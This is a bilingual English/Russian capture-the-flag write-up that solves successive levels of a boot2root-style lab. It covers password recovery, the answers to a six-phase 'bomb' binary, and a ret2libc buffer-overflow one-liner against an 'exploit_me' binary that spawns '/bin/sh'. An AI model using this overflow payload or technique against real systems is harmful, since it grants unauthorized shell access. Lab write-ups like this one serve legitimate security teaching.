
### lmezard

We can see tar archive here. There are a lot of files in this archieve. Every file contains
line of code and comments with number of this line. We can use our "build_program.py" script to get
full program. Compile and run this program. Got "Iheartpwnage" password and advice to use sha-256.
Видим архив, в котором куча файлов. Понятно, что в файлах лежат куски кода,
также в каждом файле порядковый номер данного куска. Используя простецкий скрипт
build_program.py добываем прогу на си и запускаем. Выводится пароль и подсказка, что
его надо прогнать через sha-256.

### laurie
echo -n "Iheartpwnage" | shasum -a 256
laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

scp -P 2222 laurie@127.0.0.1:bomb ./

gdb bomb
    disas main
    disas phase_1
    x/1cs 0x80497c0
    "Public speaking is very easy."

    disas phase_2
    Тут читается 6 чисел. Первое - 1, и потом в цикле prev * (index(cur) + 1)
    "1 2 6 24 120 720"

    disas phase_3
    Тут мне стало понятно, что попытки разобраться в асм коде будут тщетными, и я скачал cutter.
    Видим switch-case. Нужно, чтобы первое число совпало с свитчом, буква с буквой внтри свитча и число с числом внутри свитча.
    0 q 777
    1 b 214

    phase_4
    Рекурсивная функция, которая возвращает число. Нужно 55.
    1 -> 1
    2 -> 2
    3 -> 3
    4 -> 5
    5 -> 8
    6 -> 13
    7 -> 21
    8 -> 34
    9 -> 55

    phase_5
    Нужно получить слово "giants" из массива символов.
    Вводится также слово из 6 букв.
    Полученные индексы: 15 0 5 11 13 1.
    Эти индексы получаются путём битового умножения аски-символа на 0xf.
    Получаем слово "opekmq".
    

    phase_6
    Получает 6 чисел
    4 цикла
    1) Проверяет что числа уникальны
    2) 3) выставляет в том порядке, который был введён
    4) Проверяет что массив отсортирован

    Числа:  253 725 301 997 212 432
    "4 2 6 3 1 5"

"Publicspeakingisveryeasy.126241207201b2149opekmq426315"

### thor
Используем скрипт "parse_turtle_steps.py" на файле turtle
Получаем слово SLASH
md5 -s SLASH
Получаем хэш по md5: 646da671ca01bb5d84dbb5fb2238dc8e, это и есть пароль для zaz.

### zaz
Видим файл exploit_me. Название намекает, что его надо взломать.
Это бинарник, который принимает аргумент и печатает его.
Через gdb можем посмотреть, что создаётся буфер размером 144, и в него копируется аргумент через strcpy.
Можем использовать ret2lib exploit. Для этого надо переполнить буфер и поместить в регистр eip адрес
команды system и в качестве аргумента передать адрес строки '/bin/sh'

gdb exploit_me
    break main
    run
    print &system                           > 0xb7e6b060 > '\xb7\xe6\xb0\x60'
    find &system, +9999999, "/bin/sh"       > 0xb7f8cc58 > '\xb7\xf8\xcc\x58'

./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'aaaa' + '\xb7\xf8\xcc\x58'[::-1])")

Подробное описание эксплойта.
https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf

gdb шпаргалка
https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
